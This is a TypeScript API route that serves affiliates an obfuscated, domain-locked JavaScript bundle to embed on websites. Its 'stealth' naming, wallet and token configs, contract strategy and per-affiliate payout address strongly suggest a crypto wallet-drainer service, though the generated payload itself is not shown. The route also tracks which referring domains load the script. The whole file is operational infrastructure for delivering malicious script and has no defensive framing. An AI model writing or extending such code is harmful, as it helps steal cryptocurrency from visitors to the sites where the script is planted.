/**
 * GET /api/script?configId=aff_xxxx
 *
 * Dynamic script endpoint — affiliates embed this URL directly:
 *   <script src="https://yourdomain.com/api/script?configId=aff_xxxx"></script>
 *
 * Self-hosted dashboard (no affiliate id): use GET /api/sdk (see Compile page) or
 * /generated-scripts/stealthv26-latest.min.js after compiling.
 * Benefits over static download:
 *  - Real-time config updates (no re-download)
 *  - Usage tracking per request
 *  - Can disable configs instantly
 */

import { getAffiliateProject, getAffiliateConfig } from "@/lib/projects";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { obfuscateScript, obfuscateWithDomainLock } from "@/lib/obfuscator";
import { getRedis } from "@/lib/redis";
import { getEventBus, TOPICS } from "@/lib/kafka";
import { trackDomainHit } from "@/lib/domains";
import {
  defaultGeneralConfig,
  defaultWalletConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultAdvancedConfig,
} from "@/lib/mock-data";
import { readOperationalConfig } from "@/lib/operational-config-store";

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const configId = searchParams.get("configId");

  if (!configId) {
    return new Response("// Error: missing configId parameter", {
      status: 400,
      headers: { "content-type": "application/javascript" },
    });
  }

  const project = await getAffiliateProject(configId);
  if (!project || project.status !== "active") {
    return new Response("// Error: config not found or disabled", {
      status: 404,
      headers: { "content-type": "application/javascript" },
    });
  }

  // Track hit
  const redis = await getRedis();
  const today = new Date().toISOString().split("T")[0];
  await redis.incr(`hits:${configId}:${today}`);
  await redis.incr(`hits:${configId}:total`);

  // Track referrer domain
  const referer = request.headers.get("referer");
  if (referer) {
    try {
      const domain = new URL(referer).hostname;
      await redis.incr(`hits:${configId}:domain:${domain}`);
      // Track domain activity in domain management
      trackDomainHit(domain).catch(() => {});
    } catch { /* ignore bad referer */ }
  }

  // Publish analytics event (non-blocking)
  try {
    const bus = await getEventBus();
    await bus.publish({
      topic: TOPICS.CONTRACT_CALLED,
      key: configId,
      value: {
        type: "script_load",
        configId,
        referer: referer || "direct",
        userAgent: request.headers.get("user-agent") || "",
      },
    });
  } catch { /* non-blocking */ }

  // Load config or use defaults
  const config = await getAffiliateConfig(configId);
  const operational = await readOperationalConfig();
  const general = config?.general ?? defaultGeneralConfig;
  const wallet = config?.wallet ?? defaultWalletConfig;
  const modal = config?.modal ?? { ...defaultModalConfig, exposeExternalSDK: true };
  const tokens = config?.tokens ?? defaultTokensConfig;
  const advanced = config?.advanced ?? defaultAdvancedConfig;

  const sdkBundleRaw = generateSDKBundle({
    general,
    wallet,
    modal: { ...modal, exposeExternalSDK: true },
    tokens,
    advanced,
    contracts: operational.contracts,
    strategy: operational.strategy,
    appKit: operational.appKit,
    receiverAddress: project.payoutAddress,
    affiliateLabel: project.name,
  });

  // Obfuscate (medium by default for dynamic serving)
  let sdkBundle: string;
  if (project.domains && project.domains.length > 0) {
    sdkBundle = await obfuscateWithDomainLock(sdkBundleRaw, project.domains, "medium");
  } else {
    sdkBundle = await obfuscateScript(sdkBundleRaw, "medium");
  }

  return new Response(sdkBundle, {
    headers: {
      "content-type": "application/javascript; charset=utf-8",
      "cache-control": "public, max-age=300, s-maxage=300",
      "access-control-allow-origin": "*",
    },
  });
}
